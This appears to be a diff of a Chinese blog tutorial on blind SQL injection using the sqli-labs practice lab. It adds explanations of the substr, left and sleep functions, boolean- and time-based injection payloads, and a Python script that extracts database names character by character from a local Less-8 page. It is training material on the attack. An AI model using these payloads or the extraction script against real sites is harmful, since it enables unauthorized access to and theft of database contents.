@@ -194,7 +194,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      731 字
+      1k 字
     </span>
   
 
@@ -204,7 +204,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      8
+      12
        分钟
     </span>
   
@@ -264,28 +264,27 @@
 <ul>
 <li><p>用来截取字符串的函数：</p>
 <ul>
-<li><strong><code>mid()</code></strong></li>
+<li><strong><code>mid()</code></strong>    </li>
 </ul>
-<p>​       </p>
 <figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> MID(<span class="hljs-built_in">column_name</span>,<span class="hljs-keyword">start</span>[,length]) <span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br></code></pre></div></td></tr></table></figure>
 
 <table>
 <thead>
 <tr>
-<th align="left">参数</th>
+<th align="center">参数</th>
 <th align="left">描述</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">column_name</td>
+<td align="center">column_name</td>
 <td align="left">必需。要提取字符的字段。</td>
 </tr>
 <tr>
-<td align="left">start</td>
+<td align="center">start</td>
 <td align="left">必需。规定开始位置（起始值是 1）。</td>
 </tr>
 <tr>
-<td align="left">length</td>
+<td align="center">length</td>
 <td align="left">可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td>
 </tr>
 </tbody></table>
@@ -302,16 +301,38 @@
 <p>string - 指定的要截取的字符串。<br>start - 必需，规定在字符串的何处开始。<br>正数 - 在字符串的指定位置开始<br>负数 - 在从字符串结尾的指定位置开始<br>0 - 在字符串中的第一个字符处开始<br>length - 指定要截取的字符串长度</p>
 <p>可以看出用法同mid()类似</p>
 <p>如：</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br>//返回数据库的第二位，然后与a的ascii值比较<br>substr((<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-type">text</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br>//查找test数据库的第一个表名并提取表名的第一位,然后与a的ascii值作比较。<br></code></pre></div></td></tr></table></figure></li>
+<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br>//返回数据库的第二位，然后与a的ascii值比较<br>substr((<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-type">text</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br>//查找test数据库的第一个表名并提取表名的第一位,然后与a的ascii值作比较。<br></code></pre></div></td></tr></table></figure>
+
+
+
+<ul>
+<li><p><code>left()</code></p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(string,n)</span></span><br></code></pre></div></td></tr></table></figure>
+
+<p>string ： 必要参数，要截取的字符串。</p>
+<p>n : 必要参数，规定截取的长度，从1开始。</p>
+<p>如：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-comment">//查看数据库名的第一位并和a的ascii作比较</span><br></code></pre></div></td></tr></table></figure></li>
+</ul>
+</li>
 <li><p>用来针对基于时间的盲注的函数：</p>
 <ul>
-<li><code>sleep()</code></li>
+<li><p><code>sleep()</code></p>
+<figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>(<span class="hljs-variable">seconds</span>)</span><br></code></pre></div></td></tr></table></figure>
+
+<p>seconds ： 必要参数，延迟的秒数。</p>
+<figure class="highlight lisp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lisp">if(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;&#x27;a&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))#<br></code></pre></div></td></tr></table></figure>
+
+<p>检测数据库的第一个字符的ascii值，再与a的ascii比较，如果浏览器直接显示，说明比a大，如果浏览器五秒后才显示，说明比a小</p>
+</li>
 </ul>
 </li>
 </ul>
 <h4 id="python脚本部分："><a href="#python脚本部分：" class="headerlink" title="python脚本部分："></a>python脚本部分：</h4><ul>
 <li><p>安装request库</p>
 <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">pip install request<br><span class="hljs-regexp">//</span>win <span class="hljs-number">10</span>下 ctrl+r 输入cmd 运行<br></code></pre></div></td></tr></table></figure></li>
+<li><p>代码实现</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs moonscript">#! -*- <span class="hljs-name">encoding</span>:utf<span class="hljs-number">-8</span> -*-<br># python3<br><span class="hljs-keyword">import</span> requests<br>#用这里的语句分别替换id中的内容即可爆库、表、字段<br>#<span class="hljs-built_in">select</span> group_concat(SCHEMA_NAME) <span class="hljs-keyword">from</span> information_schema.SCHEMATA<br>#<span class="hljs-built_in">select</span> group_concat(TABLE_NAME) <span class="hljs-keyword">from</span> information_schema.TABLES where TABLE_SCHEMA = <span class="hljs-string">&#x27;xxx&#x27;</span><br>#<span class="hljs-built_in">select</span> group_concat(COLUMN_NAME) <span class="hljs-keyword">from</span> information_schema.COLUMNS where TABLE_SCHEMA = <span class="hljs-string">&#x27;xxx&#x27;</span> <span class="hljs-keyword">and</span> TABLE_NAME = <span class="hljs-string">&#x27;xxx&#x27;</span><br>dic=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz,_&#x27;</span><br>url=<span class="hljs-string">&#x27;http://127.0.0.1/sqli-labs/Less-8/?id=1\&#x27; and &#x27;</span><br><span class="hljs-built_in">string</span>=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-name">dic</span>:<br>        id=<span class="hljs-string">&quot;substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;--+&quot;</span>.format(str(i),ascii(j))<br>        #<span class="hljs-built_in">print</span>(id)<br>        url_get=(url+id)<br>        #<span class="hljs-built_in">print</span>(url_get)<br>        r=requests.get(url_get)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You&quot;</span> <span class="hljs-keyword">in</span> r.<span class="hljs-name">text</span>:<br>            <span class="hljs-built_in">string</span>+=j<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">string</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">string</span>)<br></code></pre></div></td></tr></table></figure></li>
 </ul>
 
             </div>
